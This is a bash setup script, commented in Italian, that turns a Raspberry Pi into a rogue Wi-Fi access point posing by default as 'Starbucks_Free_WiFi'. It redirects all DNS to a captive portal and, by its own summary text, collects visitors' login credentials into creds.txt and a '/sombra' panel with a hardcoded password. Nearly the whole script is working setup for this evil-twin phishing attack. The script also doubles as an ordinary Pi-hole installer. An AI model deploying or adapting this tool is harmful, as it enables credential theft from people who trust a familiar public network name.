#!/usr/bin/env bash
#
# setup.sh - Un Raspberry Pi, due mestieri.
#
#   CAMPO : il Pi si aggancia al TUO hotspot WPA2 (Rete 1) e crea la sua rete
#           (Rete 2) con il captive portal. I telefoni fanno login e navigano
#           attraverso l'hotspot.
#   CASA  : il Pi e' un normale Pi-hole, collegato col cavo ethernet.
#
# I due mestieri vogliono la stessa rubrica internet (porta 53) e la stessa
# porta web (80): per questo l'interruttore `starbucks-mode` ne tiene acceso
# uno solo alla volta. All'avvio la scelta e' automatica (cavo = casa).
#
# Uso:
#   sudo PORTAL_UPLINK_PSK="password-hotspot" bash pi-portal/setup.sh
#
# Variabili opzionali:
#   PORTAL_SSID            SSID della rete AP del Pi   (default: Starbucks_Free_WiFi)
#   PORTAL_STA_SSID        SSID dell'hotspot uplink    (default: PORTAL_SSID)
#   PORTAL_UPLINK_PSK      password WPA2 dell'hotspot  (default: rete aperta)
#   PORTAL_UPSTREAM_SSID   nome della "Rete 1" mostrato ai client (default: PORTAL_STA_SSID)
#   PORTAL_CHANNEL         canale AP                   (default: auto = canale uplink)
#   PORTAL_IP              IP dell'AP                  (default: 10.3.0.1)
#   PORTAL_SUBNET          subnet AP                   (default: 10.3.0.0/24)
#   PORTAL_DHCP_START/END  range DHCP                  (default: 10.3.0.100 / .250)
#   PORTAL_UPSTREAM_DNS    DNS pubblico per i client dopo il login (default: 1.1.1.1,8.8.8.8)
#   PORTAL_WPA_PASSPHRASE  se valorizzata, l'AP del Pi e' WPA2 (default: aperto)
#   PORTAL_WEB_PORT        porta dell'app              (default: 8080; la 80 resta a Pi-hole)
#   PORTAL_APP_DIR         cartella di installazione   (default: /opt/starbucks-portal)
#   PORTAL_SKIP_APT        =1 salta l'installazione dei pacchetti
#   PORTAL_SKIP_DEPLOY     =1 salta la copia dell'app e npm install
#   PORTAL_INITIAL_MODE    auto|campo|casa             (default: auto)
#
set -euo pipefail

# ---------- configurazione ----------
PORTAL_SSID="${PORTAL_SSID:-Starbucks_Free_WiFi}"
PORTAL_STA_SSID="${PORTAL_STA_SSID:-$PORTAL_SSID}"
PORTAL_UPLINK_PSK="${PORTAL_UPLINK_PSK:-}"
PORTAL_UPSTREAM_SSID="${PORTAL_UPSTREAM_SSID:-$PORTAL_STA_SSID}"
PORTAL_CHANNEL="${PORTAL_CHANNEL:-auto}"
PORTAL_IP="${PORTAL_IP:-10.3.0.1}"
PORTAL_SUBNET="${PORTAL_SUBNET:-10.3.0.0/24}"
PORTAL_DHCP_START="${PORTAL_DHCP_START:-10.3.0.100}"
PORTAL_DHCP_END="${PORTAL_DHCP_END:-10.3.0.250}"
PORTAL_UPSTREAM_DNS="${PORTAL_UPSTREAM_DNS:-1.1.1.1,8.8.8.8}"
PORTAL_WPA_PASSPHRASE="${PORTAL_WPA_PASSPHRASE:-}"
PORTAL_WEB_PORT="${PORTAL_WEB_PORT:-8080}"
PORTAL_APP_DIR="${PORTAL_APP_DIR:-/opt/starbucks-portal}"
PORTAL_UPLINK="${PORTAL_UPLINK:-wlan0}"
PORTAL_AP_IFACE="${PORTAL_AP_IFACE:-ap0}"
PORTAL_UPLINK_CON="${PORTAL_UPLINK_CON:-portal-uplink}"
PORTAL_CHAIN="${PORTAL_CHAIN:-PORTAL_CLIENTS}"
PORTAL_DNS_CHAIN="${PORTAL_DNS_CHAIN:-PORTAL_DNS}"
PORTAL_INITIAL_MODE="${PORTAL_INITIAL_MODE:-auto}"

STA_IFACE="$PORTAL_UPLINK"
AP_IFACE="$PORTAL_AP_IFACE"
PORTAL_IP_CIDR="$PORTAL_IP/${PORTAL_SUBNET##*/}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"

log()  { echo "[+] $*"; }
warn() { echo "[!] $*"; }
die()  { echo "[x] $*" >&2; exit 1; }

# ---------- preflight ----------
[ "$(id -u)" = 0 ] || die "Esegui con sudo:  sudo bash pi-portal/setup.sh"

if ! grep -qi "raspberry" /proc/device-tree/model 2>/dev/null; then
  warn "Non sembri essere su un Raspberry Pi (model: $(cat /proc/device-tree/model 2>/dev/null || echo '?'))."
  warn "Lo script e' pensato per Pi 3B+ / 4 / 5 con chip CYW43455 (AP+STA su radio singola)."
  read -r -p "Continuo comunque? [s/N] " ans || true
  [ "${ans:-n}" = "s" ] || die "Annullato."
fi

# ---------- 1. pacchetti ----------
if [ "${PORTAL_SKIP_APT:-0}" != "1" ]; then
  log "Installazione pacchetti (hostapd, dnsmasq, iptables, netfilter-persistent)..."
  apt-get update -y
  DEBIAN_FRONTEND=noninteractive apt-get install -y \
    hostapd dnsmasq iptables netfilter-persistent iw wireless-tools curl
fi

if ! command -v node >/dev/null 2>&1; then
  log "Installazione Node.js..."
  DEBIAN_FRONTEND=noninteractive apt-get install -y nodejs npm
fi
NODE_MAJOR="$(node -e 'console.log(process.versions.node.split(".")[0])' 2>/dev/null || echo 0)"
if [ "$NODE_MAJOR" -lt 18 ] 2>/dev/null; then
  die "Node.js troppo vecchio ($(node -v)); serve >= 18 (l'app usa Express 5)."
fi

# Il dnsmasq di sistema non ci serve: la porta 53 e' di dnsmasq-portal (campo)
# oppure di Pi-hole (casa). Se resta acceso, uno dei due non parte.
systemctl disable --now dnsmasq.service >/dev/null 2>&1 || true

# ---------- 2. deploy dell'app ----------
if [ "${PORTAL_SKIP_DEPLOY:-0}" != "1" ]; then
  log "Deploy dell'app in $PORTAL_APP_DIR ..."
  mkdir -p "$PORTAL_APP_DIR"
  cp -r "$REPO_DIR/app.js" "$REPO_DIR/lib" "$REPO_DIR/views" "$REPO_DIR/public" \
        "$REPO_DIR/package.json" "$REPO_DIR/package-lock.json" "$PORTAL_APP_DIR/"
  cp -r "$REPO_DIR/pi-portal" "$PORTAL_APP_DIR/"
  ( cd "$PORTAL_APP_DIR" && npm install --omit=dev --no-audit --no-fund )
fi

# ---------- 3. uplink verso l'hotspot ----------
if systemctl is-active --quiet NetworkManager 2>/dev/null && command -v nmcli >/dev/null 2>&1; then
  log "Uplink con NetworkManager: '$PORTAL_UPLINK_CON' -> SSID '$PORTAL_STA_SSID'..."
  install -d -m 755 /etc/NetworkManager/conf.d
  cat > /etc/NetworkManager/conf.d/99-starbucks-portal.conf <<'NMEOF'
# ap0 e' gestito da hostapd/dnsmasq, non da NetworkManager.
[keyfile]
unmanaged-devices=interface-name:ap0
NMEOF
  nmcli connection delete "$PORTAL_UPLINK_CON" >/dev/null 2>&1 || true
  if nmcli connection add type wifi con-name "$PORTAL_UPLINK_CON" ifname "$STA_IFACE" \
       ssid "$PORTAL_STA_SSID" >/dev/null 2>&1; then
    if [ -n "$PORTAL_UPLINK_PSK" ]; then
      nmcli connection modify "$PORTAL_UPLINK_CON" \
        wifi-sec.key-mgmt wpa-psk wifi-sec.psk "$PORTAL_UPLINK_PSK" >/dev/null 2>&1 || true
    else
      nmcli connection modify "$PORTAL_UPLINK_CON" wifi-sec.key-mgmt none >/dev/null 2>&1 || true
    fi
    # la connessione la attiva `starbucks-mode campo`, non l'autoconnect
    nmcli connection modify "$PORTAL_UPLINK_CON" connection.autoconnect no >/dev/null 2>&1 || true
    log "Profilo '$PORTAL_UPLINK_CON' creato (autoconnect off)."
  else
    warn "Creazione del profilo nmcli fallita: configuralo a mano con nmcli."
  fi
else
  WPA_CONF="/etc/wpa_supplicant/wpa_supplicant-${STA_IFACE}.conf"
  if [ ! -f "$WPA_CONF" ]; then
    log "Uplink senza NetworkManager: scrivo $WPA_CONF (SSID: $PORTAL_STA_SSID)..."
    if [ -n "$PORTAL_UPLINK_PSK" ]; then
      cat > "$WPA_CONF" <<WPAEOF
ctrl_interface=DIR=/var/run/wpa_supplicant
update_config=1

network={
    ssid="$PORTAL_STA_SSID"
    psk="$PORTAL_UPLINK_PSK"
}
WPAEOF
    else
      cat > "$WPA_CONF" <<WPAEOF
ctrl_interface=DIR=/var/run/wpa_supplicant
update_config=1

network={
    ssid="$PORTAL_STA_SSID"
    key_mgmt=NONE
}
WPAEOF
    fi
    chmod 600 "$WPA_CONF"
    systemctl enable "wpa_supplicant@${STA_IFACE}.service" >/dev/null 2>&1 || true
    systemctl restart "wpa_supplicant@${STA_IFACE}.service" >/dev/null 2>&1 || true
  else
    warn "Trovata configurazione wpa_supplicant esistente ($WPA_CONF): la lascio intatta."
  fi
fi

# ---------- 4. banda e canale dell'AP (radio singola) ----------
STA_CH=""
STA_MHZ=""
if IW_INFO="$(iw dev "$STA_IFACE" info 2>/dev/null)"; then
  STA_CH="$(printf '%s\n' "$IW_INFO" | awk '/channel/ {print $2; exit}')"
  STA_MHZ="$(printf '%s\n' "$IW_INFO" | awk '/channel/ {print $3; exit}' | tr -cd '0-9')"
fi

if [ "$PORTAL_CHANNEL" = "auto" ]; then
  case "$STA_CH" in
    ''|*[!0-9]*) PORTAL_CHANNEL="6";;
    *) PORTAL_CHANNEL="$STA_CH";;
  esac
fi

# Stessa BANDA dell'uplink: radio singola, non si puo' fare altrimenti.
HW_MODE="g"
if { [ -n "$STA_MHZ" ] && [ "$STA_MHZ" -ge 4000 ] 2>/dev/null; } \
   || { [ "$PORTAL_CHANNEL" -gt 14 ] 2>/dev/null; }; then
  HW_MODE="a"
fi
BAND="2.4GHz"; [ "$HW_MODE" = "a" ] && BAND="5GHz"
log "AP su canale $PORTAL_CHANNEL (banda $BAND, hw_mode=$HW_MODE)."

# ---------- 5. interfaccia ap0 ----------
log "Creo l'interfaccia virtuale $AP_IFACE su $STA_IFACE..."
iw dev "$STA_IFACE" interface add "$AP_IFACE" type __ap 2>/dev/null \
  || warn "$AP_IFACE esiste gia' o non creabile ora (ci pensa create-ap0.service al boot)."
ip link set "$AP_IFACE" up 2>/dev/null || true

install -m 644 "$SCRIPT_DIR/systemd/create-ap0.service" /etc/systemd/system/
systemctl daemon-reload
# non lo abilitiamo: lo avvia `starbucks-mode`
systemctl restart create-ap0.service >/dev/null 2>&1 || true

# ---------- 6. hostapd ----------
log "Configuro hostapd (SSID: $PORTAL_SSID, canale: $PORTAL_CHANNEL, banda: $HW_MODE)..."
{
  echo "interface=$AP_IFACE"
  echo "driver=nl80211"
  echo "ssid=$PORTAL_SSID"
  echo "hw_mode=$HW_MODE"
  echo "channel=$PORTAL_CHANNEL"
  echo "wmm_enabled=0"
  echo "macaddr_acl=0"
  echo "auth_algs=1"
  echo "ignore_broadcast_ssid=0"
  if [ -n "$PORTAL_WPA_PASSPHRASE" ]; then
    echo "wpa=2"
    echo "wpa_passphrase=$PORTAL_WPA_PASSPHRASE"
    echo "wpa_key_mgmt=WPA-PSK"
    echo "rsn_pairwise=CCMP"
  fi
} > /etc/hostapd/hostapd-portal.conf
chmod 600 /etc/hostapd/hostapd-portal.conf

install -m 644 "$SCRIPT_DIR/systemd/hostapd-portal.service" /etc/systemd/system/

# ---------- 7. dnsmasq del portale (config DEDICATA, fuori da /etc/dnsmasq.d) ----------
log "Configuro dnsmasq del portale (subnet $PORTAL_SUBNET, ogni dominio -> $PORTAL_IP)..."
mkdir -p /etc/dnsmasq.d
rm -f /etc/dnsmasq.d/starbucks-portal.conf   # residuo delle versioni vecchie
{
  echo "# Generato da pi-portal/setup.sh - NON mettere in /etc/dnsmasq.d"
  echo "interface=$AP_IFACE"
  echo "bind-interfaces"
  echo "dhcp-authoritative"
  echo "dhcp-range=$PORTAL_DHCP_START,$PORTAL_DHCP_END,12h"
  echo "dhcp-option=option:router,$PORTAL_IP"
  echo "dhcp-option=option:dns-server,$PORTAL_UPSTREAM_DNS"
  echo "address=/#/$PORTAL_IP"
  echo "no-resolv"
} > /etc/dnsmasq-portal.conf
chmod 644 /etc/dnsmasq-portal.conf

install -m 644 "$SCRIPT_DIR/systemd/dnsmasq-portal.service" /etc/systemd/system/

# ---------- 8. unit dell'app, passthrough e interruttore ----------
log "Installazione unit e interruttore (starbucks-mode)..."
cat > /etc/starbucks-portal.env <<ENVEOF
PORT=$PORTAL_WEB_PORT
PORTAL_ENABLED=1
PORTAL_GRANT=1
PORTAL_HOSTS=$PORTAL_IP
PORTAL_REDIRECT_BASE=http://$PORTAL_IP
PORTAL_CHAIN=$PORTAL_CHAIN
PORTAL_DNS_CHAIN=$PORTAL_DNS_CHAIN
PORTAL_IP=$PORTAL_IP
PORTAL_IP_CIDR=$PORTAL_IP_CIDR
PORTAL_AP_IFACE=$AP_IFACE
PORTAL_SSID="$PORTAL_SSID"
PORTAL_UPLINK=$STA_IFACE
PORTAL_UPLINK_CON=$PORTAL_UPLINK_CON
PORTAL_UPSTREAM_SSID="$PORTAL_UPSTREAM_SSID"
PORTAL_WEB_PORT=$PORTAL_WEB_PORT
PORTAL_APP_DIR=$PORTAL_APP_DIR
ENVEOF
chmod 600 /etc/starbucks-portal.env

install -m 644 "$SCRIPT_DIR/systemd/starbucks-portal.service" /etc/systemd/system/
install -m 644 "$SCRIPT_DIR/systemd/portal-passthrough.service" /etc/systemd/system/
install -m 644 "$SCRIPT_DIR/systemd/portal-passthrough.timer" /etc/systemd/system/
install -m 644 "$SCRIPT_DIR/systemd/starbucks-mode-auto.service" /etc/systemd/system/
install -m 755 "$SCRIPT_DIR/scripts/mode.sh" /usr/local/bin/starbucks-mode
install -m 755 "$SCRIPT_DIR/scripts/doctor.sh" /usr/local/bin/starbucks-doctor
install -m 755 "$SCRIPT_DIR/scripts/portal-check.sh" "$PORTAL_APP_DIR/pi-portal/scripts/portal-check.sh"
chown -R root:root "$PORTAL_APP_DIR" 2>/dev/null || true

systemctl daemon-reload

# Le unit del portale NON si abilitano al boot: decide l'interruttore.
systemctl disable create-ap0.service hostapd-portal.service \
  dnsmasq-portal.service starbucks-portal.service >/dev/null 2>&1 || true
systemctl enable starbucks-mode-auto.service >/dev/null 2>&1 || true

# ---------- 9. scegli la modalita' iniziale ----------
log "Imposto la modalita' iniziale: $PORTAL_INITIAL_MODE"
case "$PORTAL_INITIAL_MODE" in
  campo|casa) /usr/local/bin/starbucks-mode "$PORTAL_INITIAL_MODE" || true ;;
  *)          /usr/local/bin/starbucks-mode auto || true ;;
esac

# ---------- 10. riepilogo ----------
CURRENT="$(cat /sys/class/net/eth0/carrier 2>/dev/null || echo n/a)"
echo
echo "======================================================================="
echo " SETUP COMPLETATO"
echo "======================================================================="
echo "  Due mestieri, un interruttore:   sudo starbucks-mode {campo|casa|auto|status}"
echo "  Se qualcosa non va:             sudo starbucks-doctor"
echo
echo "  CAMPO  (nessun cavo: il Pi si aggancia all'hotspot e crea il portale)"
echo "    Hotspot uplink : $PORTAL_STA_SSID  (PSK: $([ -n "$PORTAL_UPLINK_PSK" ] && echo impostata || echo 'rete aperta'))"
echo "    Rete del Pi    : $PORTAL_SSID  ($PORTAL_SUBNET, canale $PORTAL_CHANNEL, $HW_MODE)"
echo "  CASA   (cavo ethernet: il Pi fa da Pi-hole)"
echo
echo "  Portale  : http://$PORTAL_IP/        (porta interna $PORTAL_WEB_PORT)"
echo "  Sombra   : http://$PORTAL_IP/sombra  (login: sombr4 / sombr4)"
echo "  Log      : journalctl -u starbucks-portal -f"
echo "  Creds    : $PORTAL_APP_DIR/instance/creds.txt"
echo "  Cavo eth0 adesso: $CURRENT  (1 = collegato)"
echo
echo " PROSSIMI PASSI:"
echo "  1. Accendi l'hotspot '$PORTAL_STA_SSID' e lancia: sudo starbucks-mode campo"
echo "  2. Collega il telefono alla rete '$PORTAL_SSID': si apre il portale."
echo "  3. Dopo il login il telefono esce dall'hotspot e le credenziali finiscono"
echo "     in creds.txt e su /sombra."
echo "  A casa basta il cavo: sudo starbucks-mode casa"
echo "======================================================================="
